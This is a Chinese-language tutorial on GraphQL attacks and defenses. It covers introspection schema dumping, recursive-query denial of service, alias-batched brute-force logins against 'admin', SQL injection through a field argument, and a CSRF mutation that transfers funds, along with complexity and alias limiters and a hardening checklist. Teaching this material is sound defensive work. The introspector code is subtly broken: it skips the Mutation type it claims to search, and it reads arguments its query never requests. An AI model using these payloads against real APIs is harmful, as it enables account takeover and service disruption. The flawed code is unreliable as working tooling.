# GraphQL 深度攻击与防御

> REST 之外的 API 攻击面：Introspection、递归查询与批量攻击

---

## 1. Introspection 信息泄露

### 利用 Introspection
```graphql
# 获取完整 Schema
{
  __schema {
    types {
      name
      fields {
        name
        type { name kind }
        args { name type { name kind } }
      }
    }
  }
}

# 获取所有 Query
{
  __schema {
    queryType {
      fields { name description args { name type { name } } }
    }
  }
}

# 自动提取敏感字段
# 搜索: password, secret, token, admin, internal, debug, impersonate
```

### Introspection 自动化
```python
class GraphQLIntrospector:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.schema = None

    def extract_full_schema(self):
        query = '''
        query IntrospectionQuery {
          __schema {
            queryType { name }
            mutationType { name }
            types {
              name kind
              fields { name type { name kind ofType { name kind } } }
            }
          }
        }'''
        resp = requests.post(self.endpoint, json={'query': query})
        self.schema = resp.json()['data']['__schema']
        return self.schema

    def find_sensitive_mutations(self):
        """发现危险 Mutation"""
        keywords = ['delete', 'drop', 'admin', 'impersonate', 'reset']
        mutations = []

        for t in self.schema.get('types', []):
            if t.get('kind') == 'OBJECT' and t.get('name') == 'Mutation':
                continue
            for field in t.get('fields', []):
                if any(kw in field['name'].lower() for kw in keywords):
                    mutations.append({
                        'type': t['name'],
                        'mutation': field['name'],
                        'args': field.get('args', []),
                        'risk': 'HIGH' if 'delete' in field['name'].lower() else 'MEDIUM'
                    })
        return mutations
```

---

## 2. 递归查询 DoS (深度攻击)

```graphql
# 攻击: 利用循环引用导致指数级响应
query DeepAttack {
  users {
    posts {
      author {           # ← 循环引用!
        posts {
          author {
            posts {      # 深度 3...
              author {
                posts {  # 深度 5...
                  title
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### 防御: 查询复杂度分析
```python
class GraphQLComplexityLimiter:
    """GraphQL 查询复杂度限制器"""

    COST_RULES = {
        'default': 1,
        'connection': 5,  # 连接查询 = 5 倍开销
        'nested_object': 2,
    }

    MAX_COST = 1000

    def validate_query(self, query_ast):
        cost = self.calculate_cost(query_ast)

        if cost > self.MAX_COST:
            raise QueryTooComplexError(
                f"Query cost {cost} exceeds limit {self.MAX_COST}. "
                f"Use pagination."
            )

    def calculate_cost(self, node, depth=0):
        cost = self.COST_RULES['default']

        for field in node.selection_set.selections:
            field_cost = self.COST_RULES.get(
                field.name.value,
                self.COST_RULES['default']
            )
            cost += field_cost * (depth + 1)

            # 递归计算嵌套字段
            if hasattr(field, 'selection_set'):
                cost += self.calculate_cost(field, depth + 1)

        return cost
```

### 别名攻击 (Batching by Alias)
```graphql
# 单次请求模拟 1000 次暴力破解
mutation BruteForce {
  a1: login(username: "admin", password: "pass1") { token }
  a2: login(username: "admin", password: "pass2") { token }
  # ... 1000 个别名
  a1000: login(username: "admin", password: "pass1000") { token }
}
```

```python
# 防御: 别名计数限制
MAX_ALIASES = 10

def check_alias_limit(query_ast):
    aliases = set()
    for field in query_ast.selection_set.selections:
        if field.alias:
            aliases.add(field.alias.value)
    if len(aliases) > MAX_ALIASES:
        raise TooManyAliasesError(f"Aliases: {len(aliases)} > {MAX_ALIASES}")
```

---

## 3. GraphQL 注入

```graphql
# 字段参数注入
{
  user(id: "1 OR 1=1") {
    name
    email
  }
}

# 底层 ORM 未参数化
# SELECT * FROM users WHERE id = 1 OR 1=1
# → 返回所有用户!

# 防御: 字段级输入验证
```

### Batching CSRF
```graphql
# POST /graphql
mutation {
  # 攻击者诱导受害者浏览器发送:
  deleteAccount(userId: 123)
  transferFunds(to: "attacker", amount: 999999)
}

# 防御: CSRF Token + Content-Type: application/json
```

---

## 4. GraphQL 安全清单

```yaml
GraphQL 安全加固:
  生产环境:
    - [ ] 禁用 Introspection
    - [ ] 查询深度限制: max_depth ≤ 7
    - [ ] 查询复杂度限制: max_cost ≤ 1000
    - [ ] 别名数量限制: ≤ 10
    - [ ] 分页强制: first/last + 最大页数
    - [ ] 速率限制: 按 IP + 用户
    - [ ] CSRF 保护 (Content-Type 检查)
    - [ ] 持久化查询 (白名单 + hash)

  认证:
    - [ ] 所有 Query/Mutation 需要认证 (除登录)
    - [ ] 字段级权限: 基于角色的字段可见性
    - [ ] 参数级验证: 类型 + 范围 + 格式

  监控:
    - [ ] 查询日志 + 慢查询告警
    - [ ] 异常模式检测 (递归别名/超深查询)
```

---

*上一篇：[API 渗透测试完全指南](02-api-pentesting.md)*
